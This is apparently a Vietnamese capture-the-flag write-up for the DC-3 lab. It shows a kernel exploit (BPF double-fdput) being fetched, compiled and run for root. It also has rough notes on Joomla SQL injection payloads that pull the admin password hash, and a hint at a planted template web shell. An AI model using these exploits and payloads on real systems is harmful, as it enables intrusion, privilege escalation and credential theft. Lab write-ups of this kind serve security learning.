+searchsploit linux kernel 4.4
+```
+
+```txt
+-------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                        |  Path
+-------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation             | solaris/local/15962.c
+Linux Kernel 2.4.4 < 2.4.37.4 / 2.6.0 < 2.6.30.4 - 'Sendpage' Local Privilege Escalat | linux/local/19933.rb
+Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) -  | linux/local/9479.c
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'i | linux_x86/local/9542.c
+Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                     | linux/local/50135.c
+Linux Kernel 3.10/3.18 /4.4 - Netfilter IPT_SO_SET_REPLACE Memory Corruption          | linux/dos/39545.txt
+Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escal | linux/local/41995.c
+Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                  | linux/dos/43234.c
+Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)       | linux/local/40759.rb
+Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak    | linux/dos/46529.c
+Linux Kernel 4.4 - 'rtnetlink' Stack Memory Disclosure                                | linux/local/46006.c
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                                  | linux/dos/41457.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation                   | linux/local/41458.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Pr | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Conditio | windows_x86-64/local/47170.c
+Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege Esc | linux/local/39277.c
+Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege Esc | linux/local/40003.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Esc | linux/local/39772.txt
+Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                            | linux/local/41886.c
+Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation             | arm/local/31574.c
+Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service          | linux/dos/42136.c
+Linux kernel < 4.10.15 - Race Condition Privilege Escalation                          | linux/local/43345.c
+Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation     | linux/local/45553.c
+Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                               | linux/dos/42762.txt
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation         | linux/local/45010.c
+Linux Kernel < 4.14.rc3 - Local Denial of Service                                     | linux/dos/42932.c
+Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                              | linux/local/44325.c
+Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                  | linux/dos/44832.txt
+Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                        | linux/dos/44579.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privileg | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalatio | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local | linux/local/47169.c
+Linux Kernel < 4.5.1 - Off-By-One (PoC)                                               | linux/dos/44301.c
+-------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+trong số tất cả cái trên thì ta cần thử và có 1 cái làm được đó chính là:
+
+```bash
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Esc | linux/local/39772.txt
+```
+
+Tìm file exploit:
+
+```bash
+┌──(root㉿kali)-[/home/kali/dc-3]
+└─# wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+--2026-03-15 20:45:05--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
+Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7025 (6.9K) [application/octet-stream]
+Saving to: ‘39772.zip’
+
+39772.zip                                    100%[=============================================================================================>]   6.86K  --.-KB/s    in 0s
+
+2026-03-15 20:45:06 (55.8 MB/s) - ‘39772.zip’ saved [7025/7025]
+
+```
+
+ta thực hiện tải file exploit lên trên máy:
+
+```bash
+cd /tmp
+wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+unzip 39772.zip
+cd 39772
+tar -xvf exploit.tar
+cp /tmp/39772/ebpf_mapfd_doubleput_exploit/* /tmp/
+```
+
+Sau khi tải các file exploit lên trên máy, chúng ta có thể sử dụng công cụ khai thác để thực sự có được quyền root.
+
+```bash
+www-data@DC-3:/tmp$ ./compile.sh
+./compile.sh
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+www-data@DC-3:/tmp$ ls
+ls
+39772
+39772.zip
+__MACOSX
+compile.sh
+doubleput
+doubleput.c
+hello
+hello.c
+suidhelper
+suidhelper.c
+systemd-private-0fcf9288989d4c9cb3a211531265d1ec-systemd-timesyncd.service-HuX1Lc
+vmware-root
+www-data@DC-3:/tmp$ ls -l
+ls -l
+total 76
+drwxr-xr-x 3 www-data www-data  4096 Mar 16 10:56 39772
+-rw-r--r-- 1 www-data www-data  7025 Mar 16 10:53 39772.zip
+drwxrwxr-x 3 www-data www-data  4096 Aug 16  2016 __MACOSX
+-rwxr-x--- 1 www-data www-data   155 Mar 16 10:56 compile.sh
+-rwxr-xr-x 1 www-data www-data 12336 Mar 16 11:01 doubleput
+-rw-r----- 1 www-data www-data  4188 Mar 16 10:56 doubleput.c
+-rwxr-xr-x 1 www-data www-data  8028 Mar 16 11:01 hello
+-rw-r----- 1 www-data www-data  2186 Mar 16 10:56 hello.c
+-rwxr-xr-x 1 www-data www-data  7524 Mar 16 11:01 suidhelper
+-rw-r----- 1 www-data www-data   255 Mar 16 10:56 suidhelper.c
+drwx------ 3 root     root      4096 Mar 16 10:25 systemd-private-0fcf9288989d4c9cb3a211531265d1ec-systemd-timesyncd.service-HuX1Lc
+drwx------ 2 root     root      4096 Mar 16 10:25 vmware-root
+www-data@DC-3:/tmp$ ./compile.sh
+./compile.sh
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+www-data@DC-3:/tmp$ ./doubleput
+./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+```
+
+như vậy chúng ta đã có quyền `root`:
+
+![alt text](IMG/DC-3/image-4.png)
+
+```txt
+root@DC-3:/tmp#whoami
+whoami
+root
+root@DC-3:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@DC-3:/tmp# cd /root
+cd /root
+root@DC-3:/root# ls -l
+ls -l
+total 4
+-rw-r--r-- 1 root root 604 Mar 26  2019 the-flag.txt
+root@DC-3:/root# cat the-flag.txt
+cat the-flag.txt
+ __        __   _ _   ____                   _ _ _ _
+ \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
+  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
+   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
+    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
+
+
+Congratulations are in order.  :-)
+
+I hope you've enjoyed this challenge as I enjoyed making it.
+
+If there are any ways that I can improve these little challenges,
+please let me know.
+
+As per usual, comments and complaints can be sent via Twitter to @DCAU7
+
+Have a great day!!!! 
+```
+
+1. RCE như thế nào?
+
+2. Priv như thế nào?
+
+tại sao có phiên thì có thể có thể khai thác
+
+khai thác bằng tay bình thường
+
+khai thac SQLi
+
+
+```bash
+http://172.16.1.130/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x3a,version()))
+
+database()
+
+# http://172.16.1.130/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x3a,(SELECT SUBSTRING(table_name,1,32) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))
+# (SELECT SUBSTRING(table_name,1,32) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)
+(SELECT%20SUBSTRING(table_name,1,32)%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)
+# Lấy bảng -> users (python)
+
+# http://172.16.1.130/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x3a,(SELECT username FROM d8uea_users LIMIT 0,1)))
+# (SELECT username FROM d8uea_users LIMIT 0,1)
+(SELECT%20username%20FROM%20d8uea_users%20LIMIT%200,1)
+# Lấy user -> admin
+
+# http://172.16.1.130/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x3a,(SELECT CONCAT(username,0x3a,password) FROM d8uea_users LIMIT 0,1)))
+# (SELECT CONCAT(username,0x3a,password) FROM d8uea_users LIMIT 0,1)
+(SELECT%20CONCAT(username,0x3a,password)%20FROM%20d8uea_users%20LIMIT%200,1)
+
+
+# (SELECT CONCAT(username,0x3a,SUBSTRING(password,1,32)) FROM d8uea_users LIMIT 0,1)
+(SELECT%20CONCAT(username%2C0x3a%2CSUBSTRING(password%2C1%2C32))%20FROM%20d8uea_users%20LIMIT%200%2C1)
+
+# http://172.16.1.130/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x3a,(SELECT%20CONCAT(username,0x3a,SUBSTRING(password,1,32))%20FROM%20d8uea_users%20LIMIT%200,1)))
+(SELECT%20CONCAT(username,0x3a,SUBSTRING(password,1,30))%20FROM%20d8uea_users%20LIMIT%200,1)
+# PASS1: $2y$10$DpfpYjADpejngxNh9G
+(SELECT%20CONCAT(username,0x3a,SUBSTRING(password,26,28))%20FROM%20d8uea_users%20LIMIT%200,1)
+# PASS2: nmCeyIHCWpL97CVRnGeZsVJwR
+(SELECT%20CONCAT(username,0x3a,SUBSTRING(password,51,30))%20FROM%20d8uea_users%20LIMIT%200,1)
+# PASS3: 0kWFlfB1Zu
+# -> $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+# -> $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+
+
+# Tìm template
+# http://172.16.1.130/templates/beez3/tung.php
+
+```
+
